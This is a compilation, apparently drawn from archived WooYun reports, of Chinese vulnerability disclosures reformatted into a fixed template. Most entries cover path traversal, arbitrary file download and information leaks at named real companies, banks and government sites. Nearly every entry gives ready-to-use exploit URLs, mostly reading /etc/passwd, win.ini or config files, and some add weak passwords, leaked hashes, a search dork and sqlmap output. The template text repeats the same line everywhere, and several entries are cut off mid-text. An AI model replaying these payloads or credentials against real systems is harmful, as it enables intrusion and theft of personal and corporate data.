**详情**: 故事的起因是这样的，今天回家后发现网断了，于是找小区的物业处理，发现他们敲了某个ip地址，偷偷记下来，回家对这个ip扩散了一下，使用whatweb寻找开放的web，就找到了本次检测的站点（完全没想明白运营商是怎么跟这个采购平台联系到一起的）http://61.233.9.66/svn/  存在弱口令admin/admin进去后发现泄露了好多敏感内容，比如http://61.233.9.66/svn/web/src/mail.ini利用该密码成功登录邮箱http://61.233.9.66/svn/web/src/Core.properties  数据库信息http://61.233.9.66/svn/web/branch/V1.0/src/com/bean/BJSmsBean.java通过对文件内容的查看，发现是http://www.cfcpn.com/的其中http://www.cfcp

**POC**: 同漏洞详情

**绕过**: 直接利用

**修复**: 深挖下去应该还可获取到很多信息，不过鉴于敏感性还是点到为止，这里再总结一下所发现的问题1.svn暴露公网2.两个svn账户的弱口令3.http://www.cfcpn.com/pzweb/admin/下基本所有文件存在未授权访问4.http://www.cfcpn.com/pzweb/admin/的
---

---
### [wooyun-2015-0156285] 浦发银行某系统windows任意文件下载
**厂商**: 浦发银行 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: curl 'http://**.**.**.**/Chart/OilChart.aspx?ChartDirectorChartImage=chart_fxChart&cacheDefeat=635826864174711701&cacheId=c:\windows\win.ini'; for 16-bit app support[fonts][extensions][mci extensions][files][Mail]MAPI=1[MCI Extensions.BAK]aif=MPEGVideoaifc=MPEGVideoaiff=MPEGVideoasf=MPEGVideoasx=MPEGVideoau=MPEGVideom1v=MPEGVideom3u=MPEGVideomp2=MPEGVideomp2v=MPEGVideomp3=MPEGVideompa=MPEGVideompe

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2011-02328] 爱情公寓任意文件下载漏洞
**厂商**: 爱情公寓 | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 无

**POC**: http://www.ipart.cn/html/action/100607/intel_ipart_download_proc.php?img=../../../php/mysqlInfo.ini.php&type=mood&id=4

**绕过**: 直接利用

**修复**: 限制img参数的下载目录
---

---
### [wooyun-2013-042239] TCL某站目录遍历泄露源代码
**厂商**: TCL集团财务有限公司 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: TCL某站目录遍历泄露源代码

**POC**: http://kt.tcl.com/gw/

**绕过**: 直接利用

**修复**: 都懂的。
---

---
### [wooyun-2014-059311] 尼康中国数据库备份文件下载
**厂商**: 尼康 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试地址：www.nikon.com.cn/db.rarwww.nikon.com.cn/pass.exe测试截图：

**POC**: 看看：

**绕过**: 直接利用

**修复**: 1、目录权限控制。2、删除不必要文件。
---

---
### [wooyun-2013-025728] 常州市交通运输局地址构造遍历和上传文件
**厂商**: 常州市交通运输局 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 常州市交通运输局网站：http://www.czjt.gov.cn/任意文件遍历+下载：http://www.czjt.gov.cn:8090/publicfiles/business/htmlfiles/czsjtj/ashipin/1307990171328/455.jsp?sort=1&dir=C%3A%5C上传：

**POC**: 上传：

**绕过**: 直接利用

**修复**: 修补，我想中国互联网应急中心的人比我懂
---

---
### [wooyun-2015-0144213] 杰奇小说连载系统1.7版本任意文件下载漏洞(5案例)
**厂商**: jieqi.com | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下载最新版1.7系统进行分析， /modules/article/packdown.php 文件 cid 未做任何验证构造 /modules/article/packdown.php?id={小说id值}&cid=./../../../../../configs/define.php%00&type=txt&fname=define.php 即可下载任意文件。

**POC**: inurl:/modules/article/ 小说好多waf拦截，找了几个没拦截的http://**.**.**.**/modules/article/packdown.php?id=45346&cid=./../../../../../configs/define.php%00&type=txt&fname=define.phphttp://**.**.**.**/modules/article/packdown.php?id=59201&cid=./../../../../../configs/define.php%00&type=txt&fname=define.phphttp://*

**绕过**: 直接利用

**修复**: 验证
---

---
### [wooyun-2014-069778] qibocms下载系统 注入&另外一个老问题
**厂商**: 齐博CMS | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下载地址  http://bbs.qibosoft.com/down2.php?v=download1.0#down0x01 老问题在download/inc/job/down_encode.php中if(eregi('.php',$url)){header("location:$true_url");exit;}$webdb[upfileType] = str_replace(' ','|',$webdb[upfileType]);if(file_exists(ROOT_PATH."$webdb[updir]/$url") && eregi("($webdb[upfileType])$",$url) && filesize(ROOT_PATH."$webdb[updir]/$url")<1024*1024*10){$filetype=substr(strrchr($url,'.'),1)

**POC**: 首先注册一个会员 投稿 因为if($rsdb[pages]<2){header("location:post.php?job=edit&aid=$aid");exit;}验证了两页 所以得发两页。然后就成功注入了。

**绕过**: 过滤绕过

**修复**: 对于第一个问题  做白名单第二个 $key=intval($key);
---

---
### [wooyun-2012-014739] Mozilla基金会Mozilla.org等众多网站信息泄漏漏洞
**厂商**: Mozilla | **年份**: 2012 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://viewvc.svn.mozilla.org/vc/svn版本控制系统，导致目录遍历，数据库可下载，配置文件等可下载.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: svn版本控制系统导致的信息泄漏，设置权限应该就OK 你们比我更专业~
---

---
### [wooyun-2013-035794] 大汉版通JCMS内容管理系统任意文件下载漏洞
**厂商**: 南京大汉网络有限公司 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1. http://target/jcms/m_5_9/sendreport/downfile.jsp?filename=/etc/passwd&savename=passwd.txt要得到网站路径，访问：http://target/jcms/m_5_9/sendreport/，然后生成报表就看得到了。2. http://target/jcms/m_5_e/init/comment/opr_readfile.jsp?filename=../../../../../../../../../../../../../../../../etc/passwd3. http://target/jcms/m_5_e/init/guestbook/opr_readfile.jsp?filename=../../../../../../../../../../../../../../../../etc/pa

**POC**: 用这系统政府门户网站居多，上谷歌inurl:gov.cn/jcms一下，使用量不是很大，级别高点的也就是几个市级单位，厂商还得努力，拿软件官网www.hanweb.com测试一下：

**绕过**: 直接利用

**修复**: 限定下载目录，然后过滤".."？
---

---
### [wooyun-2014-059881] 你好万维网代理网站目录遍历可获取数百小站点站长身份证复印件
**厂商**: 你好万维网 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://61.135.129.80:8080/nihaobj.java 数据库链接地址及用户名密码信息http://61.135.129.80:8080/domain_auth/ 站长身份证复印件

**POC**: 部分站点

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-096476] 民生电商Heartbleed漏洞（OA系统登录）+文件下载导致众多会员信息泄露
**厂商**: 民生电商 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我恭恭敬敬的投了简历，期待面试，却迟迟没收到！！！问题一：心脏滴血漏洞，已登录OA系统问题url：https://oa.minshengec.cn/seeyon/index.jsp （115.182.208.5）问题二：目录文件遍历下载，众多会员信息泄露

**POC**: 已证明，不过截至到目前，目录遍历好像隐藏了，本打算面试的时候直接友情通知厂商，然厂商的修复动作真心挺快。本人声明：所有相关文件均已经删除！请厂商知悉！另：对于漏洞一，请不要认为是张观利的责任，他只不过是躺枪者

**绕过**: 直接利用

**修复**: 升级！
---

---
### [wooyun-2015-0155358] 金山毒霸主站一个奇葩的任意文件下载漏洞
**厂商**: 金山毒霸 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: empireCMS系统访问/e/即可下载文件 感到很好奇/e/admin/又可以下载文件 经下载empireCMS验证是index.php文件 还自动识别index下载好了 任意文件下载http://www.duba.net/e/admin/admin.php数据库配置文件www.duba.net/e/config/config.php数据库不支持外联 没有深入

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 金山毒霸
---

---
### [wooyun-2013-026235] 某移动公司工程建设信息支撑系统存在任意文件下载漏洞
**厂商**: 中国移动 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、漏洞地址http://211.139.140.43/cutesoft_client/cuteeditor/load.ashx?type=image&file=../../../web.config2、通过读取配置文件可以获取到网站数据库用户名与密码，网站的绝对路劲等信息。

**POC**: 据库用户名与密码，网站的绝对路劲

**绕过**: 直接利用

**修复**: 1、该漏洞是由cuteeditor造成的，建议升级下编辑器，或者对用户提交的参数进行过滤，过滤掉非法字符。
---

---
### [wooyun-2015-0154346] 东南大学某院设计缺陷致整站任意文件删除(且cookie注入)
**厂商**: 东南大学 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标：http://**.**.**.**上传点：http://**.**.**.**/admin/file.asp但是被过滤了，可以上传txt，如图继续，可以跨目录遍历删除任意文件，如图此外，cookie注入，http://**.**.**.**/onews.asp?id=2453Parameter: id (Cookie)Type: boolean-based blindTitle: AND boolean-based blind - WHERE or HAVING clausePayload: id=2453 AND 1359=1359---[15:32:30] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003 or XPweb application techn

**POC**: (见原文)

**绕过**: 直接利用

**修复**: ~
---

---
### [wooyun-2013-023712] TCL某站目录遍历，TCL CMS登录绕过（万能密码）
**厂商**: TCL | **年份**: 2013 | **类型**: 网络未授权访问

**元思考**: 触发信号: 功能测试

**洞察**: 网络未授权访问防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络未授权访问相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们懂得。。
---

---
### [wooyun-2015-0113176] 医脉通某子站任意文件读取
**厂商**: medlive.cn | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、起因http://refer.medlive.cn/control/record.inc.php?action=search&full_name=点击一个下载2、burpsuite获取信息3、存在任意文件读取

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们懂得如何修复！~~~
---

---
### [wooyun-2015-0139522] 神器而已证券系列之方正证券重要系统任意文件读取(可读取/etc/shadow)
**厂商**: 方正证券 | **年份**: 2015 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 服务器配置错误可导致任意文件读取http://wx.foundersc.com/../../../../../../../../etc/passwd发现权限比较大，还可以读取/etc/shadow不过密文没有查询到，也没有彩虹表..放弃爆破的想法

**POC**: 通过读取/root/.bash_history找到了好些敏感信息config.jsonnginx.conf

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-080436] 盛大某站任意文件下载
**厂商**: 盛大网络 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 出问题的是由你http://youni.im/index.php?r=login/Download&file=http://youni.im/index.php?r=login/Download&file=protected/config/main.php

**POC**: 其他文件我就不翻了 找起来累 证明下就好

**绕过**: 直接利用

**修复**: 你们懂的
---

---
### [wooyun-2012-08725] 太平洋保险某管理系统任意文件下载
**厂商**: 太平洋保险 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原始链接：http://vip.sz95500.com.cn:99/downLoad.jsp?fileName=help.doc其中文件下载路径参数fileName没有对路径进行必要的限制！

**POC**: http://vip.sz95500.com.cn:99/downLoad.jsp?fileName=downLoad.jsphttp://vip.sz95500.com.cn:99/downLoad.jsp?fileName=login.jsp.........and so on!

**绕过**: 直接利用

**修复**: 对下载路径做必要的限制！
---

---
### [wooyun-2013-041764] 昆明热线存在后台弱口令等多处安全漏洞
**厂商**: 昆明热线 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 上传功能, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国电信昆明分公司3g应用网站：http://3g.km169.net数据库文件及备份文件：http://3g.km169.net/database/下载后后台弱口令： admin  km169.net数据库中还有客户资料、加盟商账号资料以及许多电信3g手机参数和订单资料各种可上传，数据库可备份，模板修改处可上一句话

**POC**: 如上

**绕过**: 直接利用

**修复**: null
---

---
### [wooyun-2011-03193] SAE新浪云后端任意文件读取漏洞
**厂商**: 新浪 | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://pma.tools.sinaapp.com/是一个mysql管理端，使用了phpmyadmin，根据最近80sec在wooyun上发布的phpmyadmin任意文件读取漏洞即可读取其他文件，同时由于该应用部署在比较敏感的后端上，不受沙盒限制

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 修改限制一些功能或者等待补丁
---

---
### [wooyun-2015-0162958] 点到为止之华图教育多个漏洞打包（大量用户订单敏感信息--截止今日信息）
**厂商**: 华图教育 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 0x01:目录遍历http://bm.huatu.com/plus/bm.huatu.com商城，因此大量用户订单敏感信息泄露,信息量太大，我只贴一小段点到为止：date：20151220131740INSERT INTO `#@__shops_orders` (`oid`,`userid`,`cartcount`,`price`,`state`,`ip`,`stime`,`pid`,`paytype`,`dprice`,`priceCount`,`domain`,`fukuanfs`)VALUES ('S-P1450587909RN690','2316096','1','258.00','0','202.101.102.194','1450588660','1','2','0','258','bm5.huatu.com','18649850225');INSERT INTO `#@__s

**POC**: 0x02:三处URL跳转：http://youxue.huatu.com/plus/download.php?open=1&link=aHR0cDovL3d3dy5iYWlkdS5jb20%3Dhttp://wenku.huatu.com/plus/download.php?open=1&link=aHR0cDovL3d3dy5iYWlkdS5jb20%3Dhttp://v.huatu.com/htnews/plus/download.php?open=1&link=aHR0cDovL3d3dy5iYWlkdS5jb20%3D0x03:Nginx解析漏洞可shell:http://v.huat

**绕过**: 直接利用

**修复**: 我是来找礼物的.我是来找礼物的.我是来找礼物的.
---

---
### [wooyun-2015-0111005] 上海大智慧某站任意文件下载
**厂商**: 上海大智慧 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://pub.px.gw.com.cn/training/download.jsp?filename=training/download.jsp&name=xxx.txt

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0157157] 顺丰速运某系统存在任意文件下载漏洞
**厂商**: 顺丰速运 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://sf-ocs.sf-express.com:8080/live800/downlog.jsp?path=/&fileName=/etc/passwd

**POC**: http://sf-ocs.sf-express.com:8080/live800/downlog.jsp?path=/&fileName=/etc/hosts

**绕过**: 直接利用

**修复**: 补丁
---

---
### [wooyun-2012-011966] 贵阳银行网站目录遍历
**厂商**: 贵阳银行 | **年份**: 2012 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们高手多的是，这个我就不懂了
---

---
### [wooyun-2014-085363] CVTE数据库未授权访问以及存在多个重大漏洞
**厂商**: cvte.cn | **年份**: 2014 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: CVTE存在的漏洞有：数据库未授权访问（MongoDB未授权访问），目录遍历（泄露敏感信息），XML泄露多个服务明文用户名密码（nexus，releases，snapshots），管理平台和JBOSS登陆地址泄露（可爆破）121.199.53.253 MongoDBhttp://121.199.53.253:8081/nexus/index.htmlhttp://121.199.53.253/settings.xml  这里看登陆密码http://121.199.53.253/ 目录遍历http://121.199.53.253:8080/console   JBoss系统http://121.199.53.253:8080/fly/html/login.html  管理后台

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不用俺多说了，你懂的！
---

---
### [wooyun-2014-062787] FineCMS v1.8任意文件下载
**厂商**: dayrui.com | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 出现问题的版本是FineCMS V1.8.0 最新版。1.顺藤摸瓜漏洞文件：controllers/ApiController.php downAction方法public function downAction() {$data	= fn_authcode(base64_decode($this->get('file')), 'DECODE');$file	= isset($data['finecms']) && $data['finecms'] ? $data['finecms'] : '';if (empty($file)) $this->msg(lang('a-mod-213'));if (strpos($file, ':/')) {	//远程文件header("Location: $file");} else {	//本地图片if (!is_file($file)) $this-

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 我也不知道，你告诉我~~~
---

---
### [wooyun-2014-085494] 贵州联通超眼系统任意文件下载
**厂商**: 中联通 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登陆贵州联通超眼系统后（http://111.85.98.165/），"软件下载"处修改文件可下载任意文件。

**POC**: 1.正常的数据包2.修改数据包，下载任意文件。

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-032994] 某省地震局任意文件下载轻松获取passwd
**厂商**: 某省地震局 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 湖南省地震局：http://www.hnea.gov.cn/漏洞地址：http://www.hnea.gov.cn/manage/content/docmanage/download.jsp?filePath=/tzgg/200901/../../../../../../etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤..
---

---
### [wooyun-2014-051514] 2014年辽宁省单位公开招聘报名系统备份文件下载漏洞
**厂商**: 中华医学会 | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 202.118.40.16/网站.rar    备份文件下载。

**POC**: 通过提权获得shell。通过提权后发现网站上还有其他站点，中国医科大学成绩查询系统等。现在2月19日辽宁省事业单位招聘消息发布后，陆续有人上该网站报名注册，若有恶意攻击，影响甚为严重。

**绕过**: 直接利用

**修复**: 删除备份文件。
---

---
### [wooyun-2012-012112] 深信服应用交付报表系统任意文件下载漏洞
**厂商**: 深信服 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 版本：SANGFOR-AD-3.8.0 （深信服应用交付报表系统3.8.0）因download.php文件处理控制不当导致可跨目录下载任意文件。测试url:http://www.site.cn:85/report/download.php?pdf=../../../../../etc/passwd

**POC**: 发现漏洞是因为授权测试遇到的，不提供存在漏洞的网站连接，sorry 。test url : http://www.site.cn:85/report/download.php?pdf=../../../../../etc/passwd

**绕过**: 直接利用

**修复**: 对下载进行严格控制。
---

---
### [wooyun-2014-061085] 乐视某目录遍历导致敏感信息泄露（包含重要系统密码）
**厂商**: 乐视网 | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://117.121.54.22    目录遍历，泄露配置、密码。#1 http://117.121.54.22/cdn.cfgurl --url http://192.168.200.1/centosreboot --ejectinstalltextlang en_US.UTF-8keyboard usnetwork --bootproto=dhcp --onboot=on --hostname=cdn.oss.letv.comrootpw  --iscrypted $6$x3LvaaPd$hMXD.UGc3DbGGhZJ81WgrGSBP1vI8yu9i/DzHz7BjswmkgIQe5/grQmM.eCTOU8ETTVjMvTP/B5z/0WGPqgrq.user --name=l****e --password=$6$********xQ2D19BOt2PCh.tZ9d.2

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0128273] 中国网络电视台四台服务器配置不当导致敏感信息泄露
**厂商**: 中国网络电视台 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 标题尽量简单点目录遍历http://202.108.9.16/logs/http://202.108.9.127/logs/http://202.108.16.145:8081/admin/http://202.108.16.145:8081/manager/http://202.108.16.145:8090/admin/http://202.108.16.145:8090/manager/http://202.108.16.145:9090/manager/http://202.108.16.145:9090/admin/http://202.108.16.221:8090/admin/http://202.108.16.221:8090/manager/http://202.108.16.221:9090/admin/http://202.108.16.221:9090/manage

**POC**: logs12-15年访问日志需登陆的manager页看了几处上传比较鸡肋图不多传，就酱...

**绕过**: 直接利用

**修复**: 懂
---

---
### [wooyun-2015-0149608] 延边党建网目录遍历、服务器环境敏感信息泄漏、数据库大量敏感信息泄漏、大量个人信息泄漏等
**厂商**: 延边党建 | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先是谷歌Dork搜到延边党建。此处可见到各种压缩包和其解压后的文件，先尽数下载到本地。目录遍历中有一个phpinfo可以浏览敏感环境配置信息。在下载到本地的各备份中，可以发现不少sql数据库文件。其中一个为例：打开，尽是各种敏感信息：共计554个相关部门的用户名和密码：以及各类市民纠纷投诉以及大量个人敏感信息：在另一个数据库文件中，发现是一个新闻网站的数据：内有管理员敏感信息：

**POC**: http://**.**.**.**/延边党建网，此为目录遍历的站点http://**.**.**.**/延边新闻网，应是新闻数据库的指向地

**绕过**: 直接利用

**修复**: 请加强服务器配置请分离敏感数据库文件请不要把压缩包放在可触及的目录上面:D
---

---
### [wooyun-2014-082168] 社会科学文献出版社某站敏感信息泄露影响所有用户及管理员及数据库
**厂商**: ssap.com.cn | **年份**: 2014 | **类型**: 网络敏感信息泄漏

**元思考**: 触发信号: 认证接口

**洞察**: 网络敏感信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络敏感信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://jikan.com.cn也是社会科学文献出版社，并且和主站在同一台服务器上，数据库也是同一台先来目录遍历：简单列了一些：http://jikan.com.cnhttp://jikan.com.cn/Web/http://jikan.com.cn/bin/http://jikan.com.cn/member/http://jikan.com.cn/temp/http://jikan.com.cn/files/http://jikan.com.cn/admin/config/http://jikan.com.cn//admin/insertweb/http://jikan.com.cn/ceshi/http://jikan.com.cn/controls/http://jikan.com.cn/aaa/http://jikan.com.cn/API/		全部的cookie信息ht

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-025580] 湖北省农作物种质信息与实物共享系统目录遍历致暴库
**厂商**: 湖北省农作物种质信息与实物共享系统 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 又是一个共享系统，各种数据库文件可下载http://www.hbcgr.com/   湖北省农作物种质信息与实物共享系统数据库文件包括查询共享系统的库、动易的库、邮件库、网站配置的一个库分享系统与动易的整合较差，在输入动易常见的一些目录后就可见动易前台，甚至未作过多修改，前台管理弱口令从共享系统的一些描述文件可看出，这是中国农业科学院作物科学研究所开发的，不知利用此次入侵对该系统目录、数据库路径等信息的了解是否会对其他各省此类系统产生影响就不得而知了，时间关系不再做检测

**POC**: 如上

**绕过**: 直接利用

**修复**: 防下载、目录避免遍历、深化整合及二次开发
---

---
### [wooyun-2015-0117025] 中国银行网银业务系统任意文件包含漏洞（文件遍历、任意文件读取）
**厂商**: 中国银行 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 参数注入

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网银系统入口地址（看起来是澳门分行的网银系统入口）：https://its.bocmacau.com/prelogin.do?_locale=zh_CN&BankId=9999&LoginType=R找到一个合适的链接：还是利用_viewReferer这个参数强制覆写。然后新利用方法，把POST转为GET，用%00截断：接下来就是各种配置文件、class文件、war等：注：因为未经授权，故我只是简单的看了下，并未产生任何真实攻击行为。

**POC**: 详细漏洞说明。重放上面的数据包即可复现漏洞。

**绕过**: 截断攻击

**修复**: 尽快修复程序问题。另建议可通过文件和目录权限控制、或通过防护设备规则，来进行临时的补救。
---

---
### [wooyun-2013-028821] 中国气象局分站sql注射可任意文件读取
